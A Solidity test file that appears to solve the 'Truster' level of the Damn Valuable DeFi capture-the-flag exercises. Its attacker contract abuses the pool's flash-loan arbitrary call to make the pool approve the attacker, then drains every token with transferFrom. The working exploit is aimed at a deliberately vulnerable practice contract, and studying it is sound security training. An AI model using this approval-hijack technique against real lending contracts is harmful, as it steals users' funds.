// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "../truster/TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

interface Vm {
    function deal(address who, uint256 amount) external;
    function expectRevert(bytes calldata) external;
}

contract TrusterAttacker {
    
    function attack(TrusterLenderPool trusterLenderPool, DamnValuableToken damnValuableToken, uint256 tokensInPool) external {
        trusterLenderPool.flashLoan(
            0,
            address(trusterLenderPool),
            address(damnValuableToken),
            abi.encodeWithSelector(damnValuableToken.approve.selector, address(this), tokensInPool)
        );
        damnValuableToken.transferFrom(address(trusterLenderPool), address(this), tokensInPool);
    }
    
}

contract TrusterTest is DSTest {
    TrusterLenderPool trusterLenderPool;
    DamnValuableToken damnValuableToken;

    Vm vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    
    uint256 tokensInPool = 1000000 ether;

    function setUp() public {
        damnValuableToken = new DamnValuableToken();
        trusterLenderPool = new TrusterLenderPool(address(damnValuableToken));
        
        damnValuableToken.transfer(address(trusterLenderPool), tokensInPool);
    }

    function testTruster() public {
        TrusterAttacker attacker = new TrusterAttacker();
        
        attacker.attack(trusterLenderPool, damnValuableToken, tokensInPool);

        require(damnValuableToken.balanceOf(address(attacker)) == tokensInPool, "Balance of this should equal the amount of tokens in the pool.");
        require(damnValuableToken.balanceOf(address(trusterLenderPool)) == 0, "Balance of the pool should equal 0.");
    }
}
